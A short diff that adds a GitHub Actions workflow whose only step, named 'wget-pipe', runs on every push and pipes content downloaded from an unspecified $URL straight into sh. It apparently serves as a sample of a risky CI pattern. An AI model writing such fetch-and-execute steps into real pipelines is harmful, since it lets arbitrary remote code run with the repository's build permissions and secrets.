@@ -1,0 +1,8 @@
+on: push
+jobs:
+  exec:
+    runs-on: ubuntu-latest
+    steps:
+      - name: wget-pipe
+        run: |
+          wget -qO- "$URL" | sh
